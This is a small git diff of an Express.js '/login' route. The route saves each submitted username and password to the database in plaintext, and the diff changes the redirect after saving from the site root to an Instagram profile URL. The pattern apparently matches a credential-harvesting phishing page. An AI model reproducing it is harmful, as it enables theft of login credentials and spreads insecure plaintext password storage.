@@ -47,7 +47,7 @@ app.post("/login", async (req, res) => {
 
     const newUser = new User({ username, password });
     await newUser.save();
-        res.redirect('/');
+        res.redirect('https://www.instagram.com/harshi___111/');
   } catch (err) {
     console.error("Error saving user:", err);
     return res.status(500).send("Error saving user to database");
